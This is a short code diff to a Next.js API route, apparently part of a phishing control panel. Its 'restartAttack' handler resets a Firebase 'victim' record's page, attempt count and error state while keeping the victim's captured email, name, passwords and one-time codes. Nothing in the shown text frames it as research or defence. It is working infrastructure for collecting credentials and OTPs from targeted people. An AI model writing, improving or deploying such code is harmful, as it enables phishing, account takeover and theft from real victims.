@@ -210,13 +210,17 @@ export async function POST(request: NextRequest) {
       
       case 'restartAttack': {
         const victimRef = ref(db, 'victim');
-        // Reset only specific fields, preserving passwords and other data.
+        const currentVictimSnapshot = await get(victimRef);
+        const currentVictimData = currentVictimSnapshot.val() || {};
+
         const resetData = {
-          ...initialState.victim, // Start with a clean slate
-          // Now, carry over the data we want to keep
-          passwords: (await get(ref(db, 'victim/passwords'))).val() || {},
-          otp: (await get(ref(db, 'victim/otp'))).val() || '',
+          ...currentVictimData, // Keep existing data like email, name, passwords, otp
+          currentPage: initialState.victim.currentPage,
+          attempts: initialState.victim.attempts,
+          errorMessage: initialState.victim.errorMessage,
+          isTyping: initialState.victim.isTyping,
         };
+        
         await set(victimRef, resetData);
         return NextResponse.json({ success: true, message: 'Attack restarted' });
       }
